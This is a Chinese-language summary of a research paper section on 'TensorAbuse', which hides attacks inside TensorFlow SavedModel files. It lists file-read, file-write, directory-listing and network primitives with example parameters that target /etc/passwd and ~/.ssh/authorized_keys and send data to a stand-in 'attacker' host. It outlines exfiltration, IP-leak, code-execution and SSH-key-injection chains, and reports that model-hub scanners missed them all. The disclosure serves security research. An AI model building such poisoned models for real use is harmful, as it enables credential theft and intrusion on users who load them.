Practical Attacks against Model Hubs and Scanning Tools
---

## ✅ 5.1 攻击原语（Attack Primitives）

> 把单个 API 封装成“乐高积木”，每个原语只干一件事，可独立插入 SavedModel。

| 原语 # | 功能 | 关键技术 API | 参数要点 | 触发时机 |
|---|---|---|---|---|
| **❶ 任意文件读** | 把任意文件内容读进张量 | `ReadFile`, `FixedLengthRecordDatasetV2`, `ImmutableConst` 等 7 个 | `filename="/etc/passwd"` 或逐字节读取避免长度对齐 | 模型推理时 |
| **❷ 任意文件写** | 把张量内容写到任意路径 | `WriteFile`, `Save`, `PrintV2` 等 4 个 | `output_stream="file://~/.ssh/authorized_keys"` 支持追加写入 | 同上 |
| **❸ 目录遍历** | 枚举目录发现敏感文件 | `MatchingFiles`, `MatchingFilesDataset` 等 3 个 | 通配符如 `/home/*/.ssh/id_*` | 同上 |
| **❹ 网络发送** | 把张量数据发向任意 IP | `DebugIdentityV3`, `rpc_call`, `DataServiceDatasetV4` 等 5 个 | `debug_urls=["grpc://attacker:8080"]` | 同上 |
| **❺ 网络接收** | 从远程拉取数据/指令 | `rpc_client` | `server_address="attacker:5000"` | 同上 |

> 所有原语均 **自动触发，无需额外代码**，且 **不影响模型精度**（只增 <1% 节点）。

---

## ✅ 5.2 端到端攻击构造（4 种）

作者把原语像乐高一样组合，形成 4 个完整攻击链：

| 攻击名称 | 所需原语 | 具体流程 | 危害 |
|---|---|---|---|
| **文件泄露** | ❸→❶→❹ | 1. 用 MatchingFiles 找路径；2. ReadFile 读文件；3. DebugIdentityV3 外传 | 窃取任意敏感文件 |
| **IP 暴露** | ❹ | 让模型向恶意 gRPC 服务发一个包，服务器记录源 IP | 获取受害者公网或内网 IP |
| **代码执行** | ❷+❶ | 用 PrintV2 把恶意 Python 写入 `./tensorflow.py`，下次 `import tensorflow` 时优先加载本地同名文件 | 获得本地代码执行 |
| **Shell 访问** | ❸→❹→❷ | 1. MatchingFiles 找 `~/.ssh/authorized_keys`；2. DebugIdentityV3 把路径发到攻击者；3. 攻击者回传公钥，用 Save 写回文件 | 攻击者 SSH 登录受害者机器 |

> 攻击流程图见论文图 2、6、7、8，可直接复制代码复现。

---

## ✅ 5.3 实战验证（上传-下载-检测）

### 🧪 实验设计
- **目标模型**：Google Yamnet（声音分类，~3.9 M 参数）  
- **平台**：
  1. Hugging Face Hub（私有仓库）
  2. TensorFlow Hub（Kaggle 私有仓库）
  3. ModelScan 最新版
- **周期**：上传后保留 **两周**，观察平台扫描结果。

### 📊 检测结果
| 平台 / 工具 | 是否检出 | 备注 |
|---|---|---|
| **Hugging Face Hub** | ❌ 全部绕过 | 官方恶意模型扫描零告警 |
| **TensorFlow Hub (Kaggle)** | ❌ 全部绕过 | 无公开检测机制，两周无提示 |
| **ModelScan** | ❌ 全部绕过 | 仅对 `ReadFile/WriteFile` 报高危，可换 API 绕过 |

> **攻击模型结构、推理结果与原版 Yamnet 完全一致**，平台无法肉眼区分。

### 🕰️ 历史版本兼容性
- 用同样方法检查 **TF 1.0.0 → 2.15** 所有版本：  
  - **9 个关键 API（文件/网络）自 2015 年起就存在**，风险潜伏 8 年。  
  - 随着分布式训练需求，**2.x 新增更多网络原语**，攻击面持续扩大。

---

## 🎯 5 总结一句话
> 第 5 节把“理论能力”变成“实战武器”：**用 20 个 API 拼出 5 块积木、4 种攻击，真实模型、真实平台、零告警**，证明 TensorAbuse **不仅可行，而且正潜伏在现有生态中**。